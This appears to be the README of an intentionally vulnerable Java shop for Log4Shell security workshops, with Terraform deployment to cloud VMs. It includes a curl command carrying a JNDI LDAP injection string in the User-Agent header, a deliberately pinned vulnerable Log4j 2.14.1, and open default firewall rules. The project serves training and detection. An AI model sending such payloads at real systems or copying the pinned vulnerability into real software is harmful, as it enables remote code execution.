# TraditionalJay

Intentionally vulnerable **classic / traditional** shop for security workshops — Java on a **VM** (EC2, Azure VM, or GCP Compute Engine), not containers.

Primary story: **Log4Shell (CVE-2021-44228)** via **Log4j 2.14.1**.

> [!CAUTION]
> **Do not deploy to production accounts.** Keep VMs ephemeral and network-scoped to your lab.

## Why this exists

Jay's Surf Shop covers cloud-native runtimes (ECS / ACA / GKE). TraditionalJay covers the **host / VM** lane:

| | Surf Shop | TraditionalJay |
|--|-----------|----------------|
| Compute | Containers / serverless | Single Linux VM |
| Stack | Next.js + Python | Spring Boot + Log4j2 |
| Headline CVE | Pillow, React2Shell, YAML, … | **Log4Shell** |

## Quick start (local)

```bash
cd app
mvn -DskipTests spring-boot:run
# open http://localhost:8080
# exploit lab: http://localhost:8080/security
```

Java **11+** and Maven required.

### Log4Shell probe (workshop-safe)

1. Start a banner LDAP listener (no exploit payload served):

```bash
python3 tools/ldap-listen.py --port 1389
```

2. Open `/security`, set callback to `YOUR_IP:1389`, click **Run Log4Shell probe**.

3. The VM/Java process attempts outbound LDAP — that dial-out (+ SCA on `log4j-core:2.14.1`) is the demo signal.

You can also hit search with a crafted `User-Agent`:

```bash
curl -s "http://localhost:8080/search?q=wax" \
  -H 'User-Agent: ${jndi:ldap://127.0.0.1:1389/a}' -o /dev/null
```

## Upwind host sensor (first boot)

Pass Upwind credentials via **local** `terraform.tfvars` (gitignored). Cloud-init exports them and `scripts/install-vm.sh` runs `scripts/install-upwind-sensor.sh`:

```bash
curl -s https://get.upwind.io/sensor.sh | \
  UPWIND_CLIENT_ID=… \
  UPWIND_CLIENT_SECRET=… \
  UPWIND_AGENT_EXTRA_CONFIG="scanner-v2=true" \
  bash -s
```

AWS example `infrastructure/aws/terraform.tfvars`:

```hcl
upwind_client_id          = "…"
upwind_client_secret      = "…"
upwind_agent_extra_config = "scanner-v2=true"
```

If creds are empty, the app still installs and the sensor step is skipped.

## CI

GitHub Actions workflow [`.github/workflows/build.yml`](.github/workflows/build.yml):

- **push / PR / manual** → Maven package + upload JAR artifact  
- **tag `v*`** → GitHub Release with the fat JAR  

VMs prefer the latest Release JAR via `scripts/install-vm.sh`, and fall back to an on-box Maven build if no release exists yet.

```bash
# cut a release (triggers JAR publish)
git tag v0.1.0 && git push origin v0.1.0
```

## Deploy to a cloud VM

Each cloud folder is standalone Terraform. First boot runs `scripts/install-vm.sh` (OpenJDK 11 + Release JAR or Maven build + systemd).

### AWS (EC2)

```bash
cd infrastructure/aws
terraform init
terraform apply
terraform output application_url
```

### Azure (VM)

```bash
cd infrastructure/azure
terraform init
terraform apply -var="ssh_public_key=$(cat ~/.ssh/id_rsa.pub)"
terraform output application_url
```

### GCP (Compute Engine)

```bash
cd infrastructure/gcp
terraform init
terraform apply -var="project_id=YOUR_PROJECT"
terraform output application_url
```

First boot takes a few minutes while Maven builds on the instance. Then open `http://PUBLIC_IP:8080/security`.

## Layout

```
app/                     Spring Boot shop + /security Log4Shell UI
tools/ldap-listen.py     Banner-only LDAP listener for demos
scripts/install-vm.sh    Cloud-init / manual VM installer
infrastructure/aws|azure|gcp
```

## Safety notes

- Demo path **does not** ship a reverse-shell gadget; it triggers a **JNDI LDAP lookup** to a listener you control.
- Default firewalls allow `0.0.0.0/0` on 22/8080 — tighten `*_ingress_cidr` / source ranges for shared labs.
- Pin stays on **Log4j 2.14.1** on purpose. Do not “fix” it without replacing the exercise.
